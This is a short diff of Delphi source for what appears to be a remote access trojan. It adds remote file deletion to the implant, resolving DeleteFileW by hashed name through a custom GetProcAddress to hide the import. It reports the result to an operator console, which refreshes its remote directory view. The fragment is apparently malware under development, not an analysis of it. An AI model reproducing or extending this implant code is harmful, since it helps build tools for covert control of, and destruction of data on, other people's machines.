@@ -168,8 +168,14 @@ begin
 end;
 
 procedure pDeleteFile(pConn:PConnRec; mBuff:PWideChar);
+var
+  xDeleteFileW:function(lpFileName: LPCWSTR): BOOL; stdcall;
 begin
-  pConn.pAPI.xMessageBoxW(0,mBuff,nil,0);
+  xDeleteFileW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $654FDE9A, 11);
+  if xDeleteFileW(mBuff) then
+    pConn.xSendBuffer(pConn, CMD_FILE_DELETE_OK, nil, 1, False)
+  else
+    pConn.xSendBuffer(pConn, CMD_FILE_DELETE_FAIL, nil, 1, False);
 end;
 
 procedure pRenameFile(pConn:PConnRec; mBuff:PWideChar);
@@ -285,6 +291,14 @@ begin
       begin
         lstFiles.Clear;
         TForm3(mClientThread.frmControl).StatusBar1.SimpleText := 'Cant access folder!';
+      end;
+    CMD_FILE_DELETE_OK:
+      begin
+        SendListDirectories(edtPath.Text);
+      end;
+    CMD_FILE_DELETE_FAIL:
+      begin
+        SendListDirectories(edtPath.Text);
       end;
   end;
 end;
@@ -419,6 +433,7 @@ begin
   end;
 
 end;
+
 procedure TForm2.lstFilesCompare(Sender: TObject; Item1, Item2: TListItem;
   Data: Integer; var Compare: Integer);
 var
